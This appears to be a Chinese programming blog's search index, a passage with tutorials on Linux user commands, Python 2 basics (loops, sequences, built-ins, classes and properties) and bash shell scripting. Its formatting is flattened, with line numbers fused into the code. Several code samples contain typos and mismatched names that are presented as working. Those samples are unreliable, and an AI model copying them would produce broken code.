用户的信息传递我们知道查询一个用户的相关信息可以使用id和finger命令，查询最近的登录信息可以使用last，现在我们来了解的多一点。---#### w或者who 想要知道目前已登录在系统上的用户，可以使用w和who root@jack:~# w 16:30:11 up 2:32, 4 users, load average: 0.26, 0.23, 0.16USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot :0 :0 13:58 ?xdm? 11:31 0.09s gdm-session-worker [pam/gdm-password]root pts/0 :0 14:12 0.00s 0.57s 0.00s wroot pts/1 :0 16:29 23.00s 0.05s 0.00s sh #第一行显示目前时间，启动多久，几个用户，平均负载 #第二行为各个项目的说明root@jack:~# whoroot :0 2016-04-26 13:58 (:0)root pts/0 2016-04-26 14:12 (:0)1要知道每个账号的最近登陆的时间，则可以使用 lastlog 这个命令 root@jack:~# lastlog用户名 端口 来自 最后登陆时间root 从未登录过daemon 从未登录过12345---#### write,wall,mesg 用于linux用户间的通信 root@jack:~# write jack pts/2 “i am fine ,thank for you “```wall用于广播信息，mesg用于是否接受信息{ mesg n }:表示不接受信息]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(2)-循环]]></title>
      <url>%2F2016%2F04%2F24%2FPython(2)-%E5%BE%AA%E7%8E%AF%2F</url>
      <content type="text"><![CDATA[0x00 for循环Pthon中for循环的基本构造是12for 元素 in 序列: 执行语句 当然在Pyhton，for循环就该节后range()函数来使用12for a in range(10): print a**2 rang()这函数的功能是建立一个表，这个表的元素都是整数，从0开始，下一比前一大1，直到函数中所写的上限(但不包括上限本身)123index = range(5)print index[0,1,2,3,4] len(),rang()结合for循环1234&gt;&gt;&gt; s = &apos;wjidogdnkdd&apos;&gt;&gt;&gt; for i in range(0,len(s),2): #从第一元素开始每个两个下标输出一个元素 print s[i]输出为:w,i,o,d,k,d enumerate()结合for循环结合enumerate()每次循环的同时得到下标和元素 1234567for (index,char) in enumerate(s): print index,char输出结果:0 w1 j2 i... zip()函数结合for12345678&gt;&gt;&gt; ta = [1,2,3]&gt;&gt;&gt; tb = [4,5,6]&gt;&gt;&gt; tc = [7,8,9]&gt;&gt;&gt; for (a,b,c) in zip(ta,tb,tc): print (a,b,c)(1, 4, 7)(2, 5, 8)(3, 6, 9) 每次循环，各个序列分别从左到右取出一个元素，合并成一个tuple，然后tuple的元素赋给a，b，c。zip()函数起到了聚合列表的功能。 0x01 while 循环while循环会不停的循环执行隶属于它的语句，直到条件Wie假(Flase)123while i&lt;10: print i i = i+1 0x02 ### 中断循环continue:在循环的某一次执行中，如果遇到continue, 那么跳过这一次执行，进行下一次的操作break:停止执行整个循环 1234for i in range(10): if i == 2: continue print i 当循环执行到i = 2的时候，if条件成立，触发continue, 跳过本次执行(不执行print)，继续进行下一次执行(i = 3)。1234for i in range(10): if i == 2: break print i 当循环执行到i = 2的时候，if条件成立，触发break, 整个循环停止。 参考来源:http://www.cnblogs.com/vamei]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(3) 数据交互]]></title>
      <url>%2F2016%2F04%2F24%2FPython(3)-%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%2F</url>
      <content type="text"><![CDATA[0x00 raw_input()与input()这两个均是python的内建函数，通过读取终端的输入与用户实现数据交互，但两者是有区别的，raw_input()会直接读取控制台的输入(任何类型的输入它都可以接收)，而对于input(),它希望读取一合法的python表达式，即输入的字符串必须使用括号将它括起来，否则会引发SyntaxError错误。其实input()本质上还是使用raw_input()来实现的，只是调用完raw_input()后再去调用eval()函数了，我们甚至可以将一个表达式(4+3)作为input()的参数，但是除非对input()有特别需要，否则一般情况下我们都是使用raw_input()来与用户交互的！ – 0x01 参数(parameters) 解压(unpacking) 和变量(variables)下面我们将学习如何在调用脚本时传递参数，首先新建一个test.py的python的脚本文件，代码如下:12345from sys import argvscript,first,second=argvprint &quot;the script is called:&quot;,scriptprint &quot;your first variable is:&quot;,firstprint &quot;your second variable is:&quot;,second 然后在控制台调用脚本并给出要传递的参数(1 2):1234$ python test.py 1 2 The script is called: test.pyYour first variable is: 1Your second variable is: 2 在上面的代码段中argv即是所谓的”参数变量(argument variable)”,它包含了所有传递给python的参数，第二行的意义则是:把argv中的东西解包(unpacking),将所有的参数一次赋予左边的变量名,接下来则是正常的打印了！ 0x02 argv结合raw_input()123456789101112131415161718192021from sys import argvscript,user_name=argvprompt=&apos;&gt;&apos;print &quot;hi %s,i&apos;m the %s script.&quot; % (user_name,script)print &quot;i&apos;d like to ask you a few questions.&quot;print &quot;do you like me %s ?.&quot; % user_namelikes=raw_input(prompt)print &quot;where do you live %s?&quot; % user_namelives=raw_input(prompt)print &quot;what kind of computer do you have?&quot;computer=raw_input(prompt)print &quot;&quot;&quot;alright,so you said %r about liking me.you live in %r.Not sure where that is.and you have a %r computer.Nice&quot;&quot;&quot; % (likes,lives,computer) 在控制台运行:1$ python test.py jack 0x03 字符串的重复输出 str*51234567str＝&quot; to be nor not to be&quot;print cd*5to be or not to beto be or not to beto be or not to beto be or not to beto be or not to be 0x03 切片和索引的使用 索引从下标[0]开始，切片是从[a]到[b-1]下标 12345678str=&apos;abcdefghi&apos;&gt;&gt;&gt; s1=str[0]&gt;&gt;&gt; s2=str[4]&gt;&gt;&gt; s3=str[:4]&gt;&gt;&gt; s4=[:]&gt;&gt;&gt; s5=str[2:5]&gt;&gt;&gt; print s1,s2,s3,s4,s5a e abcd abcdefghi cde 未完待续。。。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pyhton(5)-序列:列表和元组]]></title>
      <url>%2F2016%2F04%2F24%2FPyhton(5)-%E5%BA%8F%E5%88%97%EF%BC%88Sequence%EF%BC%89-%E5%88%97%E8%A1%A8%E5%92%8C%E5%85%83%E7%BB%84%2F</url>
      <content type="text"><![CDATA[0x00 序列sequence(序列)是一组有顺序的对象的集合 ，序列有两种:tuple（元组;也翻译为定值表）和list(列表)123&gt;&gt;&gt; s1 = （1,2,3,&apos;love&apos;,5.6,False）&gt;&gt;&gt;s2 = [True,5,&apos;smile&apos;]#s1是一个tuple，s2是一个list tuple和list的主要区别在于，一旦建立，tuple的各个元素不可再更改，而list的元素可以在更改 一个序列作为另一序列的元素(嵌套列表):1&gt;&gt;&gt; s3 = [1,[3,4,5]] 0x01 序列的引用 基本引用序列元素的下标从0开始:12&gt;&gt;&gt; print s1[0]&gt;&gt;&gt; print s3[1][2] 范围引用 基本格式: [下限:上限:步长 ] 注意在引用的时候，如果写明上限，那么这个上限本身不包括在内1234567&gt;&gt;&gt;print s1[:5] # 从开始到下标4 （下标5的元素 不包括在内）&gt;&gt;&gt;print s1[2:] # 从下标2到最后&gt;&gt;&gt;print s1[0:5:2] # 从下标0到下标4 (下标5不包括在内)，每隔2取一个元素 （下标为0，2，4的元素）&gt;&gt;&gt;print s1[2:0:-1] # 从下标2到下标1尾部元素引用&gt;&gt;&gt;print s1[-1] # 序列最后一个元素&gt;&gt;&gt;print s1[-3] # 序列倒数第三个元素 0x02 进阶应用因为列表的元素是可变的，除了能对列表进行索引，切片，等操作，还能进行追加，插入，删除操作 列表赋值值得注意的是当使用一个列表向另一个列表赋值时1234567&gt;&gt;&gt; a = [1,2,3,4]&gt;&gt;&gt; b = a&gt;&gt;&gt; b[1] = 1000&gt;&gt;&gt; print a,b[1, 1000, 3, 4] [1, 1000, 3, 4] #可以看到列表a的值也发生了改变如何赋值?可以这个样b = a[:] #生成一个新的列表在赋值给b 列表的解析一种由原生列表创建新列表的简洁方法 12345678910#生成值为&#123;x**2:属于&#123;1...9]的列表&#125;&gt;&gt;&gt; list = []&gt;&gt;&gt; for x in range(1,10): list.append(x**2)&gt;&gt;&gt; print list[1, 4, 9, 16, 25, 36, 49, 64, 81]#一行代码实现&gt;&gt;&gt; list = [x**2 for x in range(1,10)]&gt;&gt;&gt; print list[1, 4, 9, 16, 25, 36, 49, 64, 81] 对于元组而言，由于其元素不可变，因此，索引，切片[:],len()等均可用，但是，append，extend，del等不可用。 可以使用元组作为列表的元素，从而保证列表内容不会被改变 元组的双向赋值12345&gt;&gt;&gt; a = (1,2,34,4,&apos;a&apos;)&gt;&gt;&gt; b = (&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;)&gt;&gt;&gt; a,b = b,a&gt;&gt;&gt; print a,b(&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;) (1, 2, 34, 4, &apos;a&apos;) 可用于序列的内建函数(built-in function)适用于表，元组，字符串的方法 S为一个序列12345len(S) #返回序列中的元素个数min(S) #返回序列中最小元素max(S) #返回序列中最大元素all(S) #返回,True,如果所有元素都为Ture的话any(S) #返回,True,如果任意一元素为True的话 适用于表和元组下面主要是查询功能，不改变序列本身，适用于表和元组1234sum(S) #返回序列中所有元素的和#x为元素值，i为索引(元素在序列中的位置)S.count(x) #返回x在s中出现的次数S.index(x) #返回x在s中第一次出现的下标 ##### 仅仅使用于表 下列方法只适用于表，由于元组的不可变更 l1,l2均为一个表123456l1.extend(l2) #在表l1的末尾添加表l2的所有元素l1.append(x) #在l1的末尾添加x元素l1.sort() #对l1的元素进行排序l1.reverse() #对l1中元素逆序l1.pop() #删除表中的最后一个元素，并返回删除的元素del l[i] #删除该元素 以上这些方法都是在原来的表的上进行操作，会对原来的表产生影响，而不是返回一个新表 下面是适用于字符串的方法 字符串是一种特殊的元组，但是字符串(string)类有一些方法是可以改变字符串的，但是这些方法本质不是对原有字符进行操作，而是删除原有字符串，再建立一个新的字符串，因此并不与元组的特点相矛盾！ 以下，str为一个字符串，sub为str的一个子字符串，s为一个序列，其它的元素都是字符串，width为一个整数，用于说明新生成字符串的宽度！ 12345str.count(sub) #返回sub在str中出现的次数str.find(sub) #从左开始，查找sub在str中第一次出现的位置，如果sub不存在，返回-1str.index(sub) #从左开始，查找sub在str中第一次出现的位置，如果sub不存在，举出错误str.rfind(sub) #从右开始，查找sub在str中第一次出现的位置，如果sub不存在，返回-1str.rindex(sub) #从右开始，查找sub在str中第一次出现的位置，如果sub不存在，则举出错误 1234567str.isalnum() #返回True，如果所有字符都是字母或数字str.isalpha() #返回True，如果所有字符都是字母str.isdigit() #返回True，如果所有字符都是数字str.istitle() #放回True，如果所有词的首字母都是大写str.isspace() #返回True，如果所有字符都是空格str.islower() #返回True，如果所有字符都是小写字母str.isupper() #返回True，如果所有字符都是大写字母 1234567str.split(&apos;分割符&apos;, num) #从左开始，以分割符为界将srt分割number次，将所得的字符放在一个表中返回，(分割符是一定存在于str中的)#####&gt;&gt;&gt; str = &apos;dsdsdf,dsdiie,9898,99980d,989dfs&apos;&gt;&gt;&gt; print(str.split(&apos;,&apos;))[&apos;dsdsdf&apos;, &apos;dsdiie&apos;, &apos;9898&apos;, &apos;99980d&apos;, &apos;989dfs&apos;]&gt;&gt;&gt; print(str.split(&apos;,&apos;, 3))[&apos;dsdsdf&apos;, &apos;dsdiie&apos;, &apos;9898&apos;, &apos;99980d,989dfs&apos;] 123456789101112str.rsplit(&apos;分割符&apos;, num) #同上，从右开始分割str.joins(s) #将s中的元素，以str为分割符，合并成为一个字符串，并返回一个新的字符串str.strip(&apos;sub&apos;) #去掉开头和结尾的&quot;sub&quot;,如去掉开头和结尾的空格，逗号等，并返回一个新的字符串str.replace(sub,new_sub) #将str中的sub替换为new_sub，并返回一个新的字符串str.capitalize() #将str的第一个字母大写，并放回一个新的字符串str.lower() #将str全部字母改为小写，并放回一个新的字符串str.upper() #将str全部字母改为大写，并放回一个新的字符串str.swapcase() #将str的大写字母改为小写，小写字母改为大写，并放回一个新的字符串str.title() #将str的每个词的首字母大写(以空格区分)，并放回一个新的字符串str.center(width) #长度为width的字符串，将原字符串放入该字符串中心，其它位置为空格 ，并放回一个新的字符串str.ljust(width) #长度为width的字符串，将原字符串左对齐放入该字符串，其它位置为空格，并放回一个新的字符串str.rjust(width) #长度为width的字符串，将原字符串右对齐放入该字符串，其它位置为空格，并放回一个新的字符串]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(12)-动态类型(dynamic typing)]]></title>
      <url>%2F2016%2F04%2F24%2FPython(13)-%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0%2F</url>
      <content type="text"><![CDATA[0x00 帮助函数 dir()和help()函数 dir()函数用来查询一个类或者对象的所有属性 1&gt;&gt;&gt; print dir(list) help()用来查询说明文档 1&gt;&gt;&gt; print help(list) 基本数据类型 type() 文本文件的输入输出 open() 循环设计 range() enumerate() zip() 循环对象 iter() 函数对象 map() filter() reduce() 0x01 数学运算 abs(-5) 取绝对值 round(2.6) 四舍五入取整 pow(2, 3) 相当于23，如果是pow(2, 4, 5)x相当于24 % 5 cmp(a, b) 比较两个数的大小:a大于b返回1，否则返回-1 divmod(9, 2) 返回除法结果和余数，本例返回(4, 1) max(),min(),sum() 求最大值，求最小值，求和 0x02 类型转换 int(“5) 转换为整数:integer float(2) 转换为浮点数:float long(“23”) 转换为长整数:long integer str(2.3) 转换为字符串:string complex(3, 9) 返回复数3+9i ord(“A’) “A”字符对应的数字 chr(65) 数字65对应的字符 unichr(65) 数字65对应的unicode字符 bool(0) 转换为相应的真假值，Python中，0相当于False，且下列对象都相当于False: [ ], ( ), { }, 0, None, 0.0, ‘ ‘ bin(56) 返回一个字符串，表示56的二进制数 hex(56) 返回一个字符串，表示56的十六进制数 oct(56) 放回一个字符串，表示56的八进制数 list((1, 3, 4)) 转换为表:list tuple([1, 3, 45]) 转换为元组:tuple slice(3, 4, -1) 构建下标对象:slice dict(a=1, b=”hello”, c=[1,2,3]) 构建词典:dictionary 0x03 list操作list是python内置的一个类，当我建立一个列表时:1n1 = [1,2,3,4,5] 实际上，n1是类list的一个对象 关list常用的的一些方法__ nl.count(5) 计数，看总共有多少个5 nl.index(3) 查询 nl 的第一个3的下标 nl.append(6) 在 nl 的最后增添一个新元素6 nl.sort() 对nl的元素排序 nl.pop(-1) 从nl中去除最后一个元素，并将该元素返回。 nl.remove(2) 从nl中去除第一个2 nl.insert(0,9) 在下标为0的位置插入9 all([True, 1, “hello!”]) 是否所有元素都相当于True值 any([“ “, 0, False, [ ], None]) 是否有任意一个元素相当于True值 sorted([1, 4, 5]) 返回正序的序列 reversed([1, 4, 5]) 返回逆序的序列，即是:[5, 4, 1] 0x04 编译，执行 repr(me) 返回对象的字符串表达式 compile(“print(‘hello’”, ‘test.py’, ‘exec’) 编译成为code对象 eval(“1 + 1”) 解释字符串表表达式，参数也可以是compile()返回的code对象 exec(“print(‘hello’)”) 解释并执行字符串，print(‘Hello’)。参数也可以是compile()返回的code对象 0x05 其它 globals() 返回全局命名空间，比如全局变量，全局函数名 locals() 返回局部命名空间 Python的强大之处在于，它提供很多已经写好的，可以现成利用的对象，在Python的标准库里还有大量可以用于操作系统互动，Internet开发，多线程，文本处理的对象，而在这些基础之上是很多外部的库，定义了更丰富的对象，比如Django等等，我们要开始攀登巨人的肩膀了！ 参考来源:http://www.cnblogs.com/vamei]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(8)-对象-属性-和-类]]></title>
      <url>%2F2016%2F04%2F24%2FPython(8)-%E5%AF%B9%E8%B1%A1-%E5%B1%9E%E6%80%A7-%E5%92%8C-%E7%B1%BB-%2F</url>
      <content type="text"><![CDATA[0x00 对象 属性 类 和方法Python使用类(class) 和对象(object)进行 面向对象(object-oriented programing,简称oop)的编程，面向对象的目的是为了提高程序的重复使用性，Python的整个概念都是基于对象的。 下面我们来定义一个鸟类:12345678910class Bird(object): have_feather = True way_of_reproduction = &quot;egg&quot;#定义了一个Bird类，并且它有两个和属性，长毛(have_feather)和下蛋(egg)summer = Bird()#创建Bird的一个对象summer，由此summer便有了Bird的属性print summer.way_of_reproduction#通过&quot; 对象.属性(object.attribute) &quot;的形式实现对属性的引用 类的内部定义的函数就是方法(method)123456789class Bird(object): have_feather = True def move(self,dx,dy): position = [0,0] position[0] = position[0]+dx position[1] = position[1]+dy retutn positionsummer = Bird()print &quot;after move:&quot;,summer.move(5,8) 看，我们从新定义了一个Bird类，为它增加了一个方法属性，方法的第一个参数是self，无论是否用到，self是为了方便内部使用，引用对象自身。 0x01 对象的继承(inheritance)123456class Chicken(Bird): way_of_move = &apos;walk&apos;summer = Chicken()print summer.have_featherprint summer.move(9,19) 新定义的鸡类(Chicken)增加了一个属性:移动方式（way_of_move） 在定义鸡类时，括号里面是(Bird),这说明Chicken是Bird的一个子类，即Chicken继承自Bird，Bird也就是Chicken的父类了，Chicken将享有Bird的所有属性(方法也是一种属性),如果括号里是object则说明该类是个父类，到头了。 0x02 关于__self__我们说过self的作用是方便在类的内部调用其方法，如下:123456789class human(object): laugh=&apos;hahaha&apos; def show_laugh(self): print self.laugh def laugh_100th(self): self.show_laugh()li_lei = human()li_lei.laugh_100th() 这里有一个类属性laugh，方法show_laugh()中，通过self.laugh，调用了该属性的值。 – 0x03 _init\_( )__init__可以理解为方法的初始化，是一个特殊方法(special method),Python有一些特殊方法，Python会特殊的对待他们，特殊方法的特点是名字前后有两个下划线 12345678class happBird(Bird): def __init__(self,more_words): print &quot;we are happy birds.&quot;,more_wordssummer = happyBird(&apos;happy,happy,haha&apos;)运行结果：we are happy birds.happy,happy,haha 可以看到，尽管我们只是创建了summer对象，但是__init__()方法被自动调用了！ 0x04 对象的性质我们上面讲到的属性都是类的属性，所有属于该类的对象都会共享这些属性，下面我们来看看对象的性质12345678910class Human(object): def __init__(self, input_gender): self.gender=input_gender def printGender(self): print sefl.genderli_lei = Human(&apos;male&apos;) #‘male’作为参数传递给__init__()方法的input_gender变量print li_lei.genderli_lei.printGender() 当我们定义方法时，必须要传递self参数，这个参数只代的就是类的一个对象，然后我们通过操纵self来修改某个对象的性质，如上:新建了的li_lei对象就被self表示，我们通过赋值给self.attribute，给li_lei添加一些性质。 对象的性质也可以被其它方法调用，调用方法与类属性的调用相似，正如在printGender()方法中的调用。 0x05 对象的属性Python一切皆对象(object),每个对象都可能有多个属性(attribute),Python的属性有一套统一的管理方案。 _属性的\_dict__系统 对象的属性可能来自其类定义，叫做类属性(class attribute),而类属性可能来源于类自身，也可能根据类定义继承来的，一个对象的属性还可能是该对象实例定义的，叫做对象属性(object attribute) Python中对象的属性存储在对象的__dict__属性中，__dict__为一个词典，键为属性名，对应的值为属性本身。，当然Python自身也会生成一些类，而这些类并不是我们自己定义的12345678910111213141516&gt;&gt;&gt; class bird(object): feather = True class chicken(bird): fly = False def __init__(self, age): self.age = agesummer = chicken(2)print(bird.__dict__)&#123;&apos;__dict__&apos;: &lt;attribute &apos;__dict__&apos; of &apos;bird&apos; objects&gt;, &apos;__module__&apos;: &apos;__main__&apos;, &apos;__weakref__&apos;: &lt;attribute &apos;__weakref__&apos; of &apos;bird&apos; objects&gt;, &apos;feather&apos;: True, &apos;__doc__&apos;: None&#125;print(chicken.__dict__)&#123;&apos;fly&apos;: False, &apos;__module__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;__init__&apos;: &lt;function __init__ at 0x0000000003141128&gt;&#125;print(summer.__dict__)&#123;&apos;age&apos;: 2&#125; 可以看到Pyhton中的属性是分层定义的，当我们有一个summer对象的时候，分别查询summer对象，chiken类，bird类以及object类的属性，就可以知道summer对象所有的dict，然后就可以找到通过对象summer可调用和修改的所有属性了 如果只有一个对象，而不知道它的类以及其他信息的时候，我们可以利用__class__属性找到对象的类，然后调用类的__base__属性查询父类1234print(summer.__class__)&lt;class &apos;__main__.chicken&apos;&gt;print(chicken.__base__)&lt;class &apos;__main__.bird&apos;&gt; 0x06 特性同一个对象的不同属性之间可能存在依赖关系，有时我们希望当某个属性被修改时，依赖于该属性的其它属性也同时变化，这时通过__dict__方式来静态的存储属性并不适用。Pyhton提供了多种即时生成属性的方法，其中一种称为特性(property),特性是特殊的属性。 123456789101112131415161718192021class bird(object): feather = Trueclass chicken(bird): fly = False def __init__(self, age): self.age = age def getAdult(self): if self.age &gt; 1.0: return True else: return False adult = property(getAdult)summer = chicken(2)print(summer.adult)summer.age = 0.5print(summer.adult) 特性使用内置函数property()来创建，property()最多可加载四个函数，前三个参数为函数，分别用于处理查询特性，修改特性，删除特性，最后一个参数为特性的文档，可以为一个字符串，起说明作用。 再来看一个例子123456789101112131415161718class num(object): def __init__(self, value): self.value = value def getNeg(self): return -self.value def setNge(self, value): self.value = -value def delNeg(self): print(&quot;value also delete!&quot;) del self.value neg = property(getNeg, setNge, delNeg, &quot;i am a negative&quot;)x = num(1.1)print(x.neg)x.neg = -22print(x.value)print(num.neg.__doc__)del x.neg 上面num为一个数字，而neg为一个特性，用来表示数字的负数delNeg表示，如果删除特性neg，那么应该执行的操作是删除属性value。property()的最后一个参数为特性neg的说明文档。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第十三章-Shell Scripts]]></title>
      <url>%2F2016%2F04%2F21%2F%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-Shell-Scripts%2F</url>
      <content type="text"><![CDATA[0x01 What is Shell Script?从字面意思可以理解为，shell script就是针对shell所写的剧本，哈哈，官方一点，shell script 是利用 shell 的功能所写的一个『程序 (program)』，这个程序是使用纯文字档，将一些 shell 的语法与命令(含外部命令)写在里面， 搭配正规表示法、管线命令与数据流重导向等功能，以达到我们所想要的处理目的。简单点，shell script就像是早期DOS年代的批处理文件(.bat)。 Why shell script?对于Linux的系统管理而言，shell script实在是一个很不错的工具，它可以汇整一些在command line下达的命令，将它写入sctipt文件中，来启动一连串的command line命令输入，就是这么简单。但是shell script也有自身的不足，比如其在大数据的运算处理上，就不够好了，速度比较慢，这时候就是python的天下了！ 第一个shell script基本了解了shell script后我们来看看编写它的一些 注意事项: 命令下达后:命令，选项与参数间的多个空白都会被忽略掉 空白行也将被忽略，并且[tab]键所占有的空白同样被视为空白键 读取到一个Enter符号(CR),就尝试运行该(串)命令。 如果一行的内容太多，可以使用{ [Enter] }来延生至下一行 #作为注解符号 关于shell script(.sh)文件的的运行 直接命令下达:shell.sh文件必须具备可读与可运行的权限(rx): 绝度路径:比如/home/sys/shell.sh来下达运行命令 相对路径:假设工作目录在/home/sys/下，则使用./shell.sh来运行 变量[PATH]的功能:将shell.sh放在PATH指定的目录内，例如:～/bin 以bash程序来运行:通过bash shell.sh或者sh shell.sh来运行 0x01 hello world!下面开始编写我们的第一个script:1234567#!/bin/bash#program# this program shows &quot;hello world,this is my first script!&quot; in your screePATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin export PATHecho &quot;hello world!\a\n&quot;exit 0 对上面程序做出一些解释: 第一行#!/bin/bash声明这个script所使用的shell#!/bin/bash来声明这个文件内的语法使用bash的语法，当程序被运行时，他会自动加载bash相关的环境配置，并且运行bash来使得文件内的命令能够运行，这很重要！ 程序内容的说明在书写内容以前，建议一定要养成这样一些说明习惯:1)内容与功能；2)版本咨询；3)作者与联络方式;4)建档日期;5)历史记录；等等，这有助于未来程序的改写与dubug！ 主要的环境变量建议将一些重要的环境变量配置好，比如PATH和LANG,如此以来，则可以让我们在运行这个程序时，可以直接下达一些外部命令，而不必写决定路径！ 退出程序我们可以利用exit这个命令来让程序中断，并且回传一个数值系统！ 0x02 简单的shell script练习编写scritp在工具最好是vim而不是vi，因为vim会有额外的语法检验！ 对谈是脚本:变量由使用者决定比如，让使用者输入自己的名字，然后显示到屏幕上:1234567891011!/bin/bash#program:# user inputs his first name and last name then shows his full name#History:#2016/04/22PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binexport PATHread -p &quot;please input you first name:&quot; firstnameread -p &quot;please input you last name:&quot; lastnameecho -e &quot;\nYour full name is:$firstname $lastname&quot; 如果想要制作一个每次运行都会依据不同的日期而变化结果的脚本呢？ 随日期变化:利用date进行文件创建实例使用者只需要输入文件名，然后自动添加创建时间12345678910111213141516171819202122#!/bin/bashPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binexport PATH#输入要创建的文件名echo -e &quot;i will use &apos;touch&apos; command to creat 3 files.&quot;read -p &quot;please input your filename:&quot; fileuserfilename=$&#123;fileuser:-&quot;fileuser&quot;&#125;#利用date命令创建文件date1=$(date --date=&apos;2 days ago&apos;+%Y%m%d) #前两天的日期date2=$(date --date=&apos;1 days ago&apos;+%Y%m%d) #前一天的日期date3=$(date +%Y%m%d) #今天的日期#配置文件名file1=$&#123;filename&#125;$&#123;date1&#125;file2=$&#123;filename&#125;$&#123;date2&#125;file3=$&#123;filename&#125;$&#123;date3&#125;#建立文件touch &quot;$file1&quot;touch &quot;$file2&quot;touch &quot;$file3 运算 我们除了declare来定义变量类型进行运算之外，还可以使用{ $((计算式)) }来进行数值运算，但是bash shell里面默认只能进行整数的计算。1234567891011PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binexport PATHread -p &quot;first number:&quot; firstnuread -p &quot;sencond number:&quot; secnutotal=$(($firstnu*$secnu))echo -e &quot;\nthe result of $firstnu*$secnu if ==&gt;$total&quot;运行:root@jack:~# sh sh04.sh first number:6sencond number:9the result of 6*9 if ==&gt;54 0x03 script的运行方式差异不同的script运行方式会造成不一样的结果: 直接运行 除了source之外的都是直接运行，当我们直接运行，其实是调用了一个子程序运行的script，当子程序完成后，在子程序内的各项变量或动作将会结束而不会传回到父程序中。 source:在父程序中运行 当使用source运行脚本式脚本内陪的变量都会在原本的bash中生效，这和不注销系统而让某些写进~/.bashrc的配置生效时，使用{ source ~/.bashrc }而不使用{ bash ~/.bashrc }__一样的！ 0x04 判断我们提到过 $? 这个变量所代表的意义， 此外，也透过 &amp;&amp; 及 || 来作为前一个命令运行回传值对於后一个命令是否要进行的依据 利用test命令测试比如判断一个文件是否存在12root@jack:~# test -e /fuckshit#什么都不返回 配合&amp;&amp;与||来使用12root@jack:~# test -e /fuckshit &amp;&amp; echo &quot;exit&quot; || echo &quot;not exit&quot;not exit test常用的判断标志:文件类型 测试标志 意义 -e 该『档名』是否存在？(常用) -f 该『档名』是否存在且为文件(file)？(常用) -d 该『档名』是否存在且为目录(directory)？(常用) 文件权限 测试标志 意义 -r 侦测该档名是否存在且具有『可读』的权限？ -w 侦测该档名是否存在且具有『可写』的权限？ -x 侦测该档名是否存在且具有『可运行』的权限？ -u 侦测该档名是否存在且具有『SUID』的权限？ -g 侦测该档名是否存在且具有『SGID』的权限？ -s 侦测该档名是否存在且为『非空白文件』？ 两个文件之间的比较如test file1 -nt file2 测试标志 意义 -nt (newer than)判断file1是否比file2新 -ot (older than)判断file1是否比file2旧 -ef 判断 file1 与 file2 是否为同一文件，可用在判断 hard link 的判定上。 主要意义在判定，两个文件是否均指向同一个 inode 哩！ 利用判断符号[ ]判读HOME是否为空1234root@jack:~# [ -z &quot;$HOME&quot; ];echo $?1root@jack:~# echo $HOME/root 在 bash的语法当中使用中括号作为 shell 的判断式时，必须要注意中括号的两端需要有空格字节来分隔12 [ &quot;$HOME&quot; == &quot;$MAIL&quot; ](我是空格)[(我是空格)&quot;$HOME&quot;(我是空格)==(我是空格)“$MAIL”(我是空格)] shell script的默认变量($0,$1….)其实系统已近为每个script默认配置好了一些，使得我们可以在运行script的同时直接添加参数以更好的使用脚本程序。 比如可以直接重新启动运行一个脚本1root@jack:~# /etc/init.d/syslog restart script配置的默认变量格式如下:1234/path/to/sciptname opt1 opt2 opt3 opt4 $0 $1 $2 $3 $4$0:这个脚本的文件名$1:来自使用者的参数，善用 $1 的话，就可以很简单的立即下达某些命令功能 此外还有一些较为特殊的变量$#,$@我们通过下面的程序来了解1234567echo &quot;the script name is ==&gt; $0&quot;echo &quot;total parameter number is ==&gt;$#&quot; [ &quot;$#&quot; -lt2 ]&amp;&amp; echo &quot;the number of parameter is less than 2.Stop here.&quot;\&amp;&amp; exit 0echo &quot;your whole parameter is ==&gt;&apos;$@&apos;&quot;echo &quot;the 1st parameter ==&gt;$1&quot;echo &quot;the 2nd parameter ==&gt;$2&quot; 运行结果如下：123456root@jack:~/scripts# sh sh07.sh chen jack jhnothe script name is ==&gt; sh07.sh #文件名total parameter number is ==&gt;3 #总的参数your whole parameter is ==&gt;&apos;chen jack jhno&apos; #参数的全部内容the 1st parameter ==&gt;chen #第一个参数the 2nd parameter ==&gt;jack #第二个参数 0x05 条件判断 if…then简单条件判断 123if [ 条件 ];then执行语句fi &lt;==fi就代表if语句的结束 多重条件判断12345 if [ 条件 ];then 条件成立执行语句else 条件不成立执行语句fi 复杂条件判断 1234567if [ 条件一 ];then条件一成立执行语句elif [ 条件二 ];then条件二成立执行语句else条件一与二均不成立执行语句fi 实例:检查主机的80端口是否开放12345678PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binexport PATHecho &quot;now,i will detect your linux server&apos;services!&quot;echo -e &quot;the www,ftp,ssh,and mail will be detect!\n&quot;testing=$(netstat -tuln | grep &quot;:80&quot;)if [ &quot;$testing&quot; != &quot;&quot; ];then echo &quot;www is running in youre system.&quot;;fi 0x06 case….esac…(类似与c中which)语法如下123456789101112131415case $变量 in&quot;第一个变量&quot;) 程序 ;;&quot;第二个变量&quot;) 程序 ;;*) 不满足一和二时执行 程序 ;;esac``` 实例: #!/bin/bash PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binexport PATH echo “this program will print you selection!” read -p “input your choice:” choicecase $choice in #case $1 in #代替前两行，这样可以执行脚本时直接添加参数“one”) echo “your choice is ONE” ;;“two”) echo “your choice is TWO” ;;“three”) echo “your choice is THREE” ;;*) echo “usage $0{one|two|three}” ;;esac12345---### 0x08 函数__语法:__ function 函数名(){ 程序}123456789---### 0x09 循环---#### while do done,until do done##### while循环当条件成立时，就执行循环体直到，while条件不成立，退出循环！ while [ 条件 ]do #循环开始 程序段done #循环结束123##### 